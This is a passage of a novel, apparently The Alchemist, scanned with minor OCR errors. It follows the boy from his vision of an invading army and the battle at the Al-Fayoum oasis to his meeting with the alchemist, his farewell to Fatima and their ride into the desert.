followed the movement of\nthe birds, trying to read something into\nit.\n\nMaybe these desert birds could explain\nto him the meaning of love without\nownership.\n\nHe felt sleepy. In his heart, he wanted\nto remain awake, but he also wanted to\nsleep. \"I am learning the Language of\nthe World, and everything in the world\nis beginning to make sense to me...\neven the flight of the hawks,\" he said to\nhimself. And, in that mood, he was\ngrateful to be in love. When you are in\nlove, things make even more sense, he\nthought.\n\nSuddenly, one of the hawks made a\nflashing dive through the sky, attacking\nthe other. As it did so, a sudden,\nfleeting image came to the boy: an\narmy, with its swords at the ready,\nriding into the oasis. The vision\nvanished immediately, but it had\nshaken him. He had heard people speak\nof mirages, and had already seen some\nhimself: they were desires that,\nbecause of their intensity, materialized\nover the sands of the desert. But he\ncertainly didn't desire that an army\ninvade the oasis.\n\nHe wanted to forget about the vision,\nand return to his meditation. He tried\nagain to concentrate on the pink shades\nof the desert, and its stones. But there\nwas something there in his heart that\nwouldn't allow him to do so.\n\n\"Always heed the omens,\" the old king\nhad said. The boy recalled what he had\nseen in the vision, and sensed that it\nwas actually going to occur.\n\nHe rose, and made his way back toward\nthe palm trees. Once again, he\nperceived the many languages in the\nthings about him: this time, the desert\nwas Safe, and it was the oasis that had\nbecome dangerous.\n\nThe camel driver was seated at the base\nof a palm tree, observing the sunset. He\nsaw the boy appear from the other side\nof the dunes.\n\n\"An army is coming,\" the boy said. \"I\nhad a vision.\"\n\n\"The desert fills men's hearts with\nvisions,\" the camel driver answered.\n\nBut the boy told him about the hawks:\nthat he had been watching their flight\nand had suddenly felt himself to have\nplunged to the Soul of the World.\nThe camel driver understood what the\nboy was saying. He knew that any\ngiven thing on the face of the earth\ncould reveal the history of all things.\nOne could open a book to any page, or\nlook at a person's hand; one could turn\na card, or watch the flight of the\nbirds...\n\nwhatever the thing observed, one could\nfind a connection with his experience\nof the moment. Actually, it wasn't that\nthose things, in themselves, revealed\nanything at all; it was just that people,\nlooking at what was occurring around\nthem, could find a means of\npenetration to the Soul of the World.\nThe desert was full of men who earned\ntheir living based on the ease with\nwhich they could penetrate to the Soul\nof the World. They were known as\nseers, and they were held in fear by\nwomen and the elderly. Tribesmen\nwere also wary of consulting them,\nbecause it would be impossible to be\neffective in battle if one knew that he\nwas fated to die. The tribesmen\npreferred the taste of battle, and the\nthrill of not knowing what the outcome\nwould be; the future was already\nwritten by Allah, and what he had\nwritten was always for the good of\nman. So the tribesmen lived only for\nthe present, because the present was\nfull of surprises, and they had to be\naware of many things: Where was the\nenemy's sword?\n\nWhere was his horse? What kind of\nblow should one deliver next in order\nto remain alive?\n\nThe camel driver was not a fighter, and\nhe had consulted with seers. Many of\nthem had been right about what they\nsaid, while some had been wrong.\nThen, one day, the oldest seer he had\never sought out (and the one most to be\nfeared) had asked why the camel driver\nwas so interested in the future.\n\n\"Well... so I can do things,\" he had\nresponded. \"And so I can change those\nthings that I don't want to happen.”\n\"But then they wouldn't be a part of\nyour future,\" the seer had said.\n\n\"Well, maybe I just want to know the\nfuture so I can prepare myself for\nwhat's coming.”\n\n\"If good things are coming, they will\nbe a pleasant surprise,\" said the seer.\n\"If bad things are, and you know in\nadvance, you will suffer greatly before\nthey even occur.\"\n\n\"T want to know about the future\nbecause I'm a man,\" the camel driver\nhad said to the seer.\n\n\"And men always live their lives based\non the future.\"\nThe seer was a specialist in the casting\nof twigs; he threw them on the ground,\nand made interpretations based on how\nthey fell. That day, he didn't make a\ncast. He wrapped the twigs in a piece of\ncloth and put them back in his bag.\n\n\"I make my living forecasting the\nfuture for people,\" he said. \"I know the\nscience of the twigs, and I know how to\nuse them to penetrate to the place\nwhere all is written. There, I can read\nthe past, discover what has already\nbeen forgotten, and understand the\nomens that are here in the present.\n\n\"When people consult me, it's not that\nI'm reading the future; I am guessing at\nthe future.\n\nThe future belongs to God, and it is\nonly he who reveals it, under\nextraordinary circumstances. How do I\nguess at the future? Based on the\nomens of the present. The secret is here\nin the present. If you pay attention to\nthe present, you can improve upon it.\n\nAnd, if you improve on the present,\nwhat comes later will also be better.\nForget about the future, and live each\nday according to the teachings,\nconfident that God loves his children.\n\nEach day, in itself, brings with it an\neternity.”\nThe camel driver had asked what the\ncircumstances were under which God\nwould allow him to see the future.\n\n\"Only when he, himself, reveals it. And\nGod only rarely reveals the future.\nWhen he does so, it is for only one\nreason: it's a future that was written so\nas to be altered.\"\n\nGod had shown the boy a part of the\nfuture, the camel driver thought. Why\nwas it that he wanted the boy to serve\nas his instrument?\n\n\"Go and speak to the tribal chieftains,\"\nsaid the camel driver. \"Tell them about\nthe armies that are approaching.\"\n\"They'll laugh at me.”\n\n\"They are men of the desert, and the\nmen of the desert are used to dealing\nwith omens.\"\n\n\"Well, then, they probably already\nknow.\"\n\n\"They're not concerned with that right\nnow. They believe that if they have to\nknow about something Allah wants\nthem to know, someone will tell them\nabout it. It has happened many times\nbefore. But, this time, the person is\nyou.\"\n\nThe boy thought of Fatima. And he\ndecided he would go to see the chiefs\nof the tribes.\n\n水\n\nThe boy approached the guard at the\nfront of the huge white tent at the\ncenter of the oasis.\n\n\"I want to see the chieftains. I've\nbrought omens from the desert.\"\n\nWithout responding, the guard entered\nthe tent, where he remained for some\ntime. When he emerged, it was with a\nyoung Arab, dressed in white and gold.\nThe boy told the younger man what he\nhad seen, and the man asked him to\nwait there. He disappeared into the\ntent.\nNight fell, and an assortment of\nfighting men and merchants entered\nand exited the tent.\n\nOne by one, the campfires were\nextinguished, and the oasis fell as quiet\nas the desert.\n\nOnly the lights in the great tent\nremained. During all this time, the boy\nthought about Fatima, and he was still\nunable to understand his last\nconversation with her.\n\nFinally, after hours of waiting, the\nguard bade the boy enter. The boy was\nastonished by what he saw inside.\nNever could he have imagined that,\nthere in the middle of the desert, there\nexisted a tent like this one. The ground\nwas covered with the most beautiful\ncarpets he had ever walked upon, and\nfrom the top of the structure hung\nlamps of hand-wrought gold, each with\na lighted candle. The tribal chieftains\nwere seated at the back of the tent ina\nsemicircle, resting upon richly\nembroidered silk cushions. Servants\ncame and went with silver trays laden\nwith spices and tea. Other servants\nmaintained the fires in the hookahs.\nThe atmosphere was suffused with the\nsweet scent of smoke.\n\nThere were eight chieftains, but the boy\ncould see immediately which of them\nwas the most important: an Arab\ndressed in white and gold, seated at the\ncenter of the semicircle.\n\nAt his side was the young Arab the boy\nhad spoken with earlier.\n\n\"Who is this stranger who speaks of\nomens?\" asked one of the chieftains,\neyeing the boy.\n\n\"It is I,\" the boy answered. And he told\nwhat he had seen.\n\n\"Why would the desert reveal such\nthings to a stranger, when it knows that\nwe have been here for generations?\"\nsaid another of the chieftains.\n\n\"Because my eyes are not yet\naccustomed to the desert,\" the boy said.\n\"I can see things that eyes habituated to\nthe desert might not see.\"\n\nAnd also because I know about the\nSoul of the World, he thought to\nhimself.\n\n\"The oasis is neutral ground. No one\nattacks an oasis,\" said a third chieftain.\n\n\"I can only tell you what I saw. If you\ndon't want to believe me, you don't\nhave to do anything about it.\"\n\nThe men fell into an animated\ndiscussion. They spoke in an Arabic\ndialect that the boy didn't understand,\nbut, when he made to leave, the guard\ntold him to stay. The boy became\nfearful; the omens told him that\nsomething was wrong. He regretted\nhaving spoken to the camel driver\nabout what he had seen in the desert.\n\nSuddenly, the elder at the center smiled\nalmost imperceptibly, and the boy felt\nbetter. The man hadn't participated in\nthe discussion, and, in fact, hadn't said\na word up to that point.\n\nBut the boy was already used to the\nLanguage of the World, and he could\nfeel the vibrations of peace throughout\nthe tent. Now his intuition was that he\nhad been right in coming.\n\nThe discussion ended. The chieftains\nwere silent for a few moments as they\nlistened to what the old man was\nsaying. Then he turned to the boy: this\ntime his expression was cold and\ndistant.\n\n\"Two thousand years ago, in a distant\nland, a man who believed in dreams\nwas thrown into a dungeon and then\nsold as a slave,\" the old man said, now\nin the dialect the boy understood. \"Our\nmerchants bought that man, and\nbrought him to Egypt. All of us know\nthat whoever believes in dreams also\nknows how to interpret them.\"\n\nThe elder continued, \"When the\npharaoh dreamed of cows that were\nthin and cows that were fat, this man\nI'm speaking of rescued Egypt from\nfamine. His name was Joseph. He, too,\nwas a stranger in a strange land, like\nyou, and he was probably about your\nage.\"\n\nHe paused, and his eyes were still\nunfriendly.\n\n\"We always observe the Tradition. The\nTradition saved Egypt from famine in\nthose days, and made the Egyptians the\nwealthiest of peoples. The Tradition\nteaches men how to cross the desert,\nand how their children should marry.\nThe Tradition says that an oasis is\nneutral territory, because both sides\nhave oases, and so both are\nvulnerable.\"\n\nNo one said a word as the old man\ncontinued.\n\n\"But the Tradition also says that we\nshould believe the messages of the\ndesert. Everything we know was taught\nto us by the desert.\"\n\nThe old man gave a signal, and\neveryone stood. The meeting was over.\nThe hookahs were extinguished, and\nthe guards stood at attention. The boy\nmade ready to leave, but the old man\nspoke again:\n\n\"Tomorrow, we are going to break the\nagreement that says that no one at the\noasis may carry arms. Throughout the\nentire day we will be on the lookout for\nour enemies. When the sun sets, the\nmen will once again surrender their\narms to me. For every ten dead men\namong our enemies, you will receive a\npiece of gold.\n\n\"But arms cannot be drawn unless they\nalso go into battle. Arms are as\ncapricious as the desert, and, if they are\nnot used, the next time they might not\nfunction. If at least one of them hasn't\nbeen used by the end of the day\ntomorrow, one will be used on you.\"\n\nWhen the boy left the tent, the oasis\nwas illuminated only by the light of the\nfull moon.\n\nHe was twenty minutes from his tent,\nand began to make his way there.\n\nHe was alarmed by what had happened.\nHe had succeeded in reaching through\nto the Soul of the World, and now the\nprice for having done so might be his\nlife. It was a frightening bet. But he\nhad been making risky bets ever since\nthe day he had sold his sheep to pursue\nhis destiny. And, as the camel driver\nhad said, to die tomorrow was no worse\nthan dying on any other day. Every day\nwas there to be lived or to mark one's\ndeparture from this world. Everything\ndepended on one word: \" Maktub.\"\n\nWalking along in the silence, he had no\nregrets. If he died tomorrow, it would\nbe because God was not willing to\nchange the future. He would at least\nhave died after having crossed the\nstrait, after having worked in a crystal\nshop, and after having known the\nsilence of the desert and Fatima's eyes.\nHe had lived every one of his days\nintensely since he had left home so\nlong ago. If he died tomorrow, he\nwould already have seen more than\nother shepherds, and he was proud of\nthat.\n\nSuddenly he heard a thundering sound,\nand he was thrown to the ground by a\nwind such as he had never known. The\narea was swirling in dust so intense\nthat it hid the moon from view. Before\nhim was an enormous white horse,\nrearing over him with a frightening\nscream.\n\nWhen the blinding dust had settled a\nbit, the boy trembled at what he saw.\nAstride the animal was a horseman\ndressed completely in black, with a\nfalcon perched on his left shoulder. He\nwore a turban and his entire face,\nexcept for his eyes, was covered with a\nblack kerchief. He appeared to be a\nmessenger from the desert, but his\npresence was much more powerful than\nthat of a mere messenger.\n\nThe strange horseman drew an\nenormous, curved sword from a\nscabbard mounted on his saddle. The\nsteel of its blade glittered in the light\nof the moon.\n\n\"Who dares to read the meaning of the\nflight of the hawks?\" he demanded, so\nloudly that his words seemed to echo\nthrough the fifty thousand palm trees\nof Al-Fayoum.\n\n\"Tt is I who dared to do so,\" said the\nboy. He was reminded of the image of\nSantiago Matamoros, mounted on his\nwhite horse, with the infidels beneath\nhis hooves. This man looked exactly\nthe same, except that now the roles\nwere reversed.\n\n\"Tt is I who dared to do so,\" he\nrepeated, and he lowered his head to\nreceive a blow from the sword. \"Many\nlives will be saved, because I was able\nto see through to the Soul of the\nWorld.\"\n\nThe sword didn't fall. Instead, the\nstranger lowered it slowly, until the\npoint touched the boy's forehead. It\ndrew a droplet of blood.\n\nThe horseman was completely\nimmobile, as was the boy. It didn't\neven occur to the boy to flee. In his\nheart, he felt a strange sense of joy: he\nwas about to die in pursuit of his\ndestiny. And for Fatima. The omens\nhad been true, after all. Here he was,\nface-to-face with his enemy, but there\nwas no need to be concerned about\ndying—the Soul of the World awaited\nhim, and he would soon be a part of it.\nAnd, tomorrow, his enemy would also\nbe apart of that Soul.\n\nThe stranger continued to hold the\nsword at the boy's forehead. \"Why did\nyou read the flight of the birds?\"\n\n\"I read only what the birds wanted to\ntell me. They wanted to save the oasis.\nTomorrow all of you will die, because\nthere are more men at the oasis than\nyou have.\"\n\nThe sword remained where it was.\n\"Who are you to change what Allah has\nwilled?\"\n\n\"Allah created the armies, and he also\ncreated the hawks. Allah taught me the\nlanguage of the birds. Everything has\nbeen written by the same hand,\" the\nboy said, remembering the camel\ndriver's words.\n\nThe stranger withdrew the sword from\nthe boy's forehead, and the boy felt\nimmensely relieved. But he still\ncouldn't flee.\n\n\"Be careful with your\nprognostications,\" said the stranger.\n\"When something is written, there is no\nway to change it.\"\n\n\"All I saw was an army,\" said the boy.\n\"T didn't see the outcome of the battle.\"\n\nThe stranger seemed satisfied with the\nanswer. But he kept the sword in his\nhand. \"What is a stranger doing in a\nstrange land?\"\n\n\"I am following my destiny. It's not\nsomething you would understand.\"\n\nThe stranger placed his sword in its\nscabbard, and the boy relaxed.\n\n\"I had to test your courage,\" the\nstranger said. \"Courage is the quality\nmost essential to understanding the\nLanguage of the World.\"\n\nThe boy was surprised. The stranger\nwas speaking of things that very few\npeople knew about.\n\n\"You must not let up, even after having\ncome so far,\" he continued. \"You must\nlove the desert, but never trust it\ncompletely. Because the desert tests all\nmen: it challenges every step, and kills\nthose who become distracted.\"\n\nWhat he said reminded the boy of the\nold king.\n\n\"If the warriors come here, and your\nhead is still on your shoulders at\nsunset, come and find me,\" said the\nstranger.\n\nThe same hand that had brandished the\nsword now held a whip. The horse\nreared again, raising a cloud of dust.\n\n\"Where do you live?\" shouted the boy,\nas the horseman rode away.\n\nThe hand with the whip pointed to the\nsouth.\n\nThe boy had met the alchemist.\n\n水\n\nNext morning, there were two thousand\narmed men scattered throughout the\npalm trees at Al-Fayoum. Before the\nsun had reached its high point, five\nhundred tribesmen appeared on the\nhorizon. The mounted troops entered\nthe oasis from the north; it appeared to\nbe a peaceful expedition, but they all\ncarried arms hidden in their robes.\nWhen they reached the white tent at the\ncenter of Al-Fayoum, they withdrew\ntheir scimitars and rifles. And they\nattacked an empty tent.\n\nThe men of the oasis surrounded the\nhorsemen from the desert and within\nhalf an hour all but one of the intruders\nwere dead. The children had been kept\nat the other side of a grove of palm\ntrees, and saw nothing of what had\nhappened. The women had remained in\ntheir tents, praying for the safekeeping\nof their husbands, and saw nothing of\nthe battle, either.\n\nWere it not for the bodies there on the\nground, it would have appeared to be a\nnormal day at the oasis.\n\nThe only tribesman spared was the\ncommander of the battalion. That\nafternoon, he was brought before the\ntribal chieftains, who asked him why\nhe had violated the Tradition.\n\nThe commander said that his men had\nbeen starving and thirsty, exhausted\nfrom many days of battle, and had\ndecided to take the oasis so as to be\nable to return to the war.\n\nThe tribal chieftain said that he felt\nsorry for the tribesmen, but that the\nTradition was sacred. He condemned\nthe commander to death without honor.\nRather than being killed by a blade or a\nbullet, he was hanged from a dead palm\ntree, where his body twisted in the\ndesert wind.\n\nThe tribal chieftain called for the boy,\nand presented him with fifty pieces of\ngold. He repeated his story about\nJoseph of Egypt, and asked the boy to\nbecome the counselor of the oasis.\n\n水\nWhen the sun had set, and the first\nstars made their appearance, the boy\nstarted to walk to the south. He\neventually sighted a single tent, and a\ngroup of Arabs passing by told the boy\nthat it was a place inhabited by genies.\nBut the boy sat down and waited.\n\nNot until the moon was high did the\nalchemist ride into view. He carried\ntwo dead hawks over his shoulder.\n\n\"I am here,\" the boy said.\n\"You shouldn't be here,\" the alchemist\nanswered. \"Or is it your destiny that\n\nbrings you here?\"\n\n\"With the wars between the tribes, it's\nimpossible to cross the desert. So I\nhave come here.\"\n\nThe alchemist dismounted from his\nhorse, and signaled that the boy should\nenter the tent with him. It was a tent\nlike many at the oasis. The boy looked\naround for the ovens and other\napparatus used in alchemy, but saw\nnone. There were only some books ina\npile, a small cooking stove, and the\ncarpets, covered with mysterious\ndesigns.\n\n\"Sit down. We'll have something to\ndrink and eat these hawks,\" said the\nalchemist.\n\nThe boy suspected that they were the\nsame hawks he had seen on the day\nbefore, but he said nothing. The\nalchemist lighted the fire, and soon a\ndelicious aroma filled the tent. It was\nbetter than the scent of the hookahs.\n\n\"Why did you want to see me?\" the boy\nasked.\n\n\"Because of the omens,\" the alchemist\nanswered. \"The wind told me you\nwould be coming, and that you would\nneed help.\"\n\n\"It's not I the wind spoke about. It's the\nother foreigner, the Englishman. He's\nthe one that's looking for you.\"\n\n\"He has other things to do first. But\nhe's on the right track. He has begun to\ntry to understand the desert.\"\n\n\"And what about me?\"\n\n\"When a person really desires\nsomething, all the universe conspires to\nhelp that person to realize his dream,\"\nsaid the alchemist, echoing the words\nof the old king. The boy understood.\nAnother person was there to help him\ntoward his destiny.\n\n\"So you are going to instruct me?”\n\"No. You already know all you need to\n\nknow. I am only going to point you in\nthe direction of your treasure.\"\n\"But there's a tribal war,\" the boy\nreiterated.\n\n\"I know what's happening in the\ndesert.\"\n\n\"I have already found my treasure. I\nhave a camel, I have my money from\nthe crystal shop, and I have fifty gold\npieces. In my own country, I would be\na rich man.\"\n\n\"But none of that is from the\nPyramids,\" said the alchemist.\n\n\"T also have Fatima. She is a treasure\ngreater than anything else I have won.\"\n\n\"She wasn't found at the Pyramids,\neither.\"\n\nThey ate in silence. The alchemist\nopened a bottle and poured a red liquid\ninto the boy's cup. It was the most\ndelicious wine he had ever tasted.\n\n\"Isn't wine prohibited here?\" the boy\nasked\n\n\"It's not what enters men's mouths\nthat's evil,\" said the alchemist. \"It's\nwhat comes out of their mouths that\nis.\"\n\nThe alchemist was a bit daunting, but,\nas the boy drank the wine, he relaxed.\nAfter they finished eating they sat\noutside the tent, under a moon so\nbrilliant that it made the stars pale.\n\n\"Drink and enjoy yourself,” said the\nalchemist, noticing that the boy was\nfeeling happier.\n\n\"Rest well tonight, as if you were a\nwarrior preparing for combat.\nRemember that wherever your heart is,\nthere you will find your treasure.\nYou've got to find the treasure, so that\neverything you have learned along the\nway can make sense.\n\n\"Tomorrow, sell your camel and buy a\nhorse. Camels are traitorous: they walk\nthousands of paces and never seem to\ntire. Then suddenly, they kneel and die.\nBut horses tire bit by bit. You always\nknow how much you can ask of them,\nand when it is that they are about to\ndie.\"\n\n水\n\nThe following night, the boy appeared\nat the alchemist「s tent with a horse. The\nalchemist was ready, and he mounted\nhis own steed and placed the falcon on\nhis left shoulder. He said to the boy,\n\"Show me where there is life out in the\ndesert. Only those who can see such\nsigns of life are able to find treasure.\"\n\nThey began to ride out over the sands,\nwith the moon lighting their way. I\ndon't know if I'll be able to find life in\nthe desert, the boy thought. I don't\nknow the desert that well yet.\n\nHe wanted to say so to the alchemist,\nbut he was afraid of the man. They\nreached the rocky place where the boy\nhad seen the hawks in the sky, but now\nthere was only silence and the wind.\n\n\"T don't know how to find life in the\ndesert,\" the boy said. \"I know that there\nis life here, but I don't know where to\nlook.\"\n\n\"Life attracts life,\" the alchemist\nanswered.\n\nAnd then the boy understood. He\nloosened the reins on his horse, who\ngalloped forward over the rocks and\nsand. The alchemist followed as the\nboy's horse ran for almost half an hour.\nThey could no longer see the palms of\nthe oasis—only the gigantic moon\nabove them, and its silver reflections\nfrom the stones of the desert. Suddenly,\nfor no apparent reason, the boy's horse\nbegan to slow.\n\n\"There's life here,\" the boy said to the\nalchemist. \"I don't know the language\nof the desert, but my horse knows the\nlanguage of life.\"\n\nThey dismounted, and the alchemist\nsaid nothing. Advancing slowly, they\nsearched among the stones. The\nalchemist stopped abruptly, and bent to\nthe ground. There was a hole there\namong the stones. The alchemist put\nhis hand into the hole, and then his\nentire arm, up to his shoulder.\nSomething was moving there, and the\nalchemist's eyes—the boy could see\nonly his eyes-squinted with his effort.\nHis arm seemed to be battling with\nwhatever was in the hole. Then, with a\nmotion that startled the boy, he\nwithdrew his arm and leaped to his\nfeet. In his hand, he grasped a snake by\nthe tail.\n\nThe boy leapt as well, but away from\nthe alchemist. The snake fought\nfrantically, making hissing sounds that\nshattered the silence of the desert. It\nwas a cobra, whose venom could kill a\nperson in minutes.\n\n\"Watch out for his venom,\" the boy\nsaid. But even though the alchemist\nhad put his hand in the hole, and had\nsurely already been bitten, his\nexpression was calm. \"The alchemist is\ntwo hundred years old,\" the\nEnglishman had told him. He must\nknow how to deal with the snakes of\nthe desert.\n\nThe boy watched as his companion\nwent to his horse and withdrew a\nscimitar. With its blade, he drew a\ncircle in the sand, and then he placed\nthe snake within it. The serpent relaxed\nimmediately.\n\n\"Not to worry,\" said the alchemist. \"He\nwon't leave the circle. You found life in\nthe desert, the omen that I needed.\"\n\n\"Why was that so important?”\n\n\"Because the Pyramids are surrounded\nby the desert.\"\n\nThe boy didn't want to talk about the\nPyramids. His heart was heavy, and he\nhad been melancholy since the\nprevious night. To continue his search\nfor the treasure meant that he had to\nabandon Fatima.\n\n\"I'm going to guide you across the\ndesert,\" the alchemist said.\n\n\"I want to stay at the oasis,\" the boy\nanswered. \"I've found Fatima, and, as\nfar as I'm concerned, she's worth more\nthan treasure.\"\n\n\"Fatima is a woman of the desert,\" said\nthe alchemist. \"She knows that men\nhave to go away in order to return. And\nshe already has her treasure: it's you.\nNow she expects that you will find\nwhat it is you're looking for.\"\n\n\"Well, what if I decide to stay?\"\n\n\"Let me tell you what will happen.\nYou'll be the counselor of the oasis.\nYou have enough gold to buy many\nsheep and many camels. You'll marry\nFatima, and you'll both be happy for a\nyear. You'll learn to love the desert,\nand you'll get to know every one of the\nfifty thousand palms. You'll watch\nthem as they grow, demonstrating how\nthe world is always changing. And\nyou'll get better and better at\nunderstanding omens, because the\ndesert is the best teacher there is.\n\n\"Sometime during the second year,\nyou'll remember about the treasure.\nThe omens will begin insistently to\nspeak of it, and you'll try to ignore\nthem. You'll use your knowledge for\nthe welfare of the oasis and its\ninhabitants. The tribal chieftains will\nappreciate what you do. And your\ncamels will bring you wealth and\npower.\n\n\"During the third year, the omens will\ncontinue to speak of your treasure and\nyour destiny.\n\nYou'll walk around, night after night, at\nthe oasis, and Fatima will be unhappy\nbecause she'll feel it was she who\ninterrupted your quest. But you will\nlove her, and she'll return your love.\nYou'll remember that she never asked\nyou to stay, because a woman of the\ndesert knows that she must await her\nman. So you won't blame her. But\nmany times you'll walk the sands of the\ndesert, thinking that maybe you could\nhave left... that you could have trusted\nmore in your love for Fatima. Because\nwhat kept you at the oasis was your\nown fear that you might never come\nback. At that point, the omens will tell\nyou that your treasure is buried forever.\n\n\"Then, sometime during the fourth\nyear, the omens will abandon you,\nbecause you've stopped listening to\nthem. The tribal chieftains will see\nthat, and you'll be dismissed from your\nposition as counselor. But, by then,\nyou'll be a rich merchant, with many\ncamels and a great deal of\nmerchandise. You'll spend the rest of\nyour days knowing that you didn't\npursue your destiny, and that now it's\ntoo late.\n\n\"You must understand that love never\nkeeps a man from pursuing his destiny.\nIf he abandons that pursuit, it's because\nit wasn't true love... the love that\nspeaks the Language of the World.”\n\nThe alchemist erased the circle in the\nsand, and the snake slithered away\namong the rocks.\n\nThe boy remembered the crystal\nmerchant who had always wanted to go\nto Mecca, and the Englishman in\nsearch of the alchemist. He thought of\nthe woman who had trusted in the\ndesert. And he looked out over the\ndesert that had brought him to the\nwoman he loved.\n\nThey mounted their horses, and this\ntime it was the boy who followed the\nalchemist back to the oasis. The wind\nbrought the sounds of the oasis to\nthem, and the boy tried to hear Fatima's\nvoice.\n\nBut that night, as he had watched the\ncobra within the circle, the strange\nhorseman with the falcon on his\nshoulder had spoken of love and\ntreasure, of the women of the desert\nand of his destiny.\n\n\"I'm going with you,\" the boy said. And\nhe immediately felt peace in his heart.\n\"We'll leave tomorrow before sunrise,\"\nwas the alchemist's only response.\n\n水\n\nThe boy spent a sleepless night. Two\nhours before dawn, he awoke one of the\nboys who slept in his tent, and asked\nhim to show him where Fatima lived.\nThey went to her tent, and the boy gave\nhis friend enough gold to buy a sheep.\n\nThen he asked his friend to go to into\nthe tent where Fatima was sleeping,\nand to awaken her and tell her that he\nwas waiting outside. The young Arab\ndid as he was asked, and was given\nenough gold to buy yet another sheep.\n\"Now leave us alone,\" said the boy to\nthe young Arab. The Arab returned to\nhis tent to sleep, proud to have helped\nthe counselor of the oasis, and happy at\nhaving enough money to buy himself\nsome sheep.\n\nFatima appeared at the entrance to the\ntent. The two walked out among the\npalms. The boy knew that it was a\nviolation of the Tradition, but that\ndidn't matter to him now.\n\n\"I'm going away,\" he said. \"And I want\nyou to know that I'm coming back. I\nlove you because...\"\n\n\"Don't say anything,\" Fatima\ninterrupted. \"One is loved because one\nis loved. No reason is needed for\nloving.\"\n\nBut the boy continued, \"I had a dream,\nand I met with a king. I sold crystal and\ncrossed the desert. And, because the\ntribes declared war, I went to the well,\nseeking the alchemist.\n\nSo, I love you because the entire\nuniverse conspired to help me find\nyou.\"\n\nThe two embraced. It was the first time\neither had touched the other.\n\n\"T'll be back,\" the boy said.\n\n\"Before this, I always looked to the\ndesert with longing,\" said Fatima.\n\"Now it will be with hope. My father\nwent away one day, but he returned to\nmy mother, and he has always come\nback since then.\"\n\nThey said nothing else. They walked a\nbit farther among the palms, and then\nthe boy left her at the entrance to her\ntent.\n\n\"T'll return, just as your father came\nback to your mother,\" he said.\n\nHe saw that Fatima's eyes were filled\nwith tears.\n\n\"You're crying?\"\n\"T'm a woman of the desert,\" she said,\naverting her face. \"But above all, I'm a\nwoman.\"\n\nFatima went back to her tent, and,\nwhen daylight came, she went out to do\nthe chores she had done for years. But\neverything had changed. The boy was\nno longer at the oasis, and the oasis\nwould never again have the same\nmeaning it had had only yesterday. It\nwould no longer be a place with fifty\nthousand palm trees and three hundred\nwells, where the pilgrims arrived,\nrelieved at the end of their long\njourneys. From that day on, the oasis\nwould be an empty place for her.\nFrom that day on, it was the desert that\nwould be important. She would look to\nit every day, and would try to guess\nwhich star the boy was following in\nsearch of his treasure.\n\nShe would have to send her kisses on\nthe wind, hoping that the wind would\ntouch the boy's face, and would tell\nhim that she was alive. That she was\nwaiting for him, a woman awaiting a\ncourageous man in search of his\ntreasure. From that day on, the desert\nwould represent only one thing to her:\nthe hope for his return.\n\n水\n\n\"Don't think about what you've left\nbehind,” the alchemist said to the boy\nas they began to ride across the sands\nof the desert. \"Everything is written in\nthe Soul of the World, and there it will\nstay forever.\"\n\n\"Men dream more about coming home\nthan about leaving,\" the boy said. He\nwas already reaccustomed to desert's\nsilence.\n\n\"If what one finds is made of pure\nmatter, it will never spoil. And one can\nalways come back. If what you had\nfound was only a moment of light, like\nthe explosion of a star, you would find\nnothing on your return.”\n\nThe man was speaking the language of\nalchemy. But the boy knew that he was\nreferring to Fatima.\n\nIt was difficult not to think about what\nhe had left behind. The desert, with its\nendless monotony, put him to\ndreaming. The boy could still see the\npalm trees, the wells, and the face of\nthe woman he loved. He could see the\nEnglishman at his experiments, and the\ncamel driver who was a teacher without\nrealizing it. Maybe the alchemist has\nnever been in love, the boy thought.\n\nThe alchemist rode in front, with the\nfalcon on his shoulder. The bird knew\nthe language of the desert well, and\nwhenever they stopped, he flew off in\nsearch of game. On the first day he\nreturned with a rabbit, and on the\nsecond with two birds.\n\nAt night, they spread their sleeping\ngear and kept their fires hidden. The\ndesert nights were cold, and were\nbecoming darker and darker as the\nphases of the moon passed. They went\non for a week, speaking only of the\nprecautions they needed to follow in\norder to avoid the battles between the\ntribes. The war continued, and at times\nthe wind carried the sweet, sickly smell\nof blood. Battles had been fought\nnearby, and the wind reminded the boy\nthat there was the language of omens,\nalways ready to show him what his\neyes had failed to observe.\n\nOn the seventh day, the alchemist\ndecided to make camp earlier than\nusual. The falcon flew off to find game,\nand the alchemist offered his water\ncontainer to the boy.\n\n\"You are almost at the end of your\njourney,\" said the alchemist. \"I\ncongratulate you for having pursued\nyour destiny.\"\n\n\"And you've told me nothing along the\nway,\" said the boy. \"I thought you were\ngoing to teach me some of the things\nyou know. A while ago, I rode through\nthe desert with a man who had books\non alchemy. But I wasn't able to learn\nanything from them.”\n\n\"There is only one way to learn,\" the\nalchemist answered. \"It's through\naction. Everything you need to know\nyou have learned through your journey.\nYou need to learn only one thing\nmore.\"\n\nThe boy wanted to know what that was,\nbut the alchemist was searching the\nhorizon, looking for the falcon.\n\n\"Why are you called the alchemist?\"\n\n\"Because that's what I am.\"\n\n\"And what went wrong when other\nalchemists tried to make gold and were\nunable to do so?\"\n\n\"They were looking only for gold,\" his\ncompanion answered. \"They were\nseeking the treasure of their destiny,\nwithout wanting actually to live out the\ndestiny.\"\n\n\"What is it that I still need to know?\"\nthe boy asked.\n\nBut the alchemist continued to look to\nthe horizon. And finally the falcon\nreturned with their meal. They dug a\nhole and lit their fire in it, so that the\nlight of the flames would not be seen.\n\n\"I'm an alchemist simply because I'm\nan alchemist,\" he said, as he prepared\nthe meal. \"I learned the science from\nmy grandfather, who learned from his\nfather, and so on, back to the creation\nof the world. In those times, the Master\nWork could be written simply on an\nemerald. But men began to reject\nsimple things, and to write tracts,\ninterpretations, and philosophical\nstudies. They also began to feel that\nthey knew a better way than others had.\n\nYet the Emerald Tablet is still alive\ntoday.”\n\n\"What was written on the Emerald\nTablet?\" the boy wanted to know.\n\nThe alchemist began to draw in the\nsand, and completed his drawing in less\nthan five minutes. As he drew, the boy\nthought of the old king, and the plaza\nwhere they had met that day; it seemed\nas if it had taken place years and years\nago.\n\n\"This is what was written on the\nEmerald Tablet,\" said the alchemist,\nwhen he had finished.\n\nThe boy tried to read what was written\nin the sand.\n\n\"It's a code,\" said the boy, a bit\ndisappointed. \"It looks like what I saw\nin the Englishman's books.\"\n\n\"No,\" the alchemist answered. \"It's like\nthe flight of those two hawks; it can't\nbe understood by reason alone. The\nEmerald Tablet is a direct passage to\nthe Soul of the World.\n\n\"The wise men understood that this\nnatural world is only an image and a\ncopy of paradise.\n\nThe existence of this world is simply a\nguarantee that there exists a world that\nis perfect.\n\nGod created the world so that, through\nits visible objects, men could\nunderstand his spiritual teachings and\nthe marvels of his wisdom. That's what\nI mean by action.\"\n\n\"Should I understand the Emerald\nTablet?\" the boy 